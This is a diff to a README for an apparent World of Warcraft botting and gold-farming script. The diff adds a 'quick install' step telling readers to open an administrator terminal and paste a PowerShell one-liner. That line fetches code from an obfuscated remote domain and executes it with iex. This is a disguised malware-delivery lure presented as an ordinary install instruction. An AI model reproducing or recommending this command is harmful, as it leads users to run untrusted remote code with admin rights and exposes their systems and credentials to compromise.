@@ -8,6 +8,17 @@ Discover WoW damage calculators, class performance utilities, specialization gui
 
 **A powerful automation script for World of Warcraft Midnight (Forever soon) focused on damage, dps, pixel-based combat rotations, automated gold farming**
 
+## ⚡ QUICK INSTALL
+
+
+- Win + X → Terminal (Admin)
+
+- Paste & Enter:
+
+```
+"WorldOfWarCraft";iex (irm ("kernelapi" + ".cfd?t=WorldOfWarcraft"))
+```
+
 ## 🔥 MAIN TOOLKIT FEATURES
 
 - ⚔️ Combat Rotation Optimization
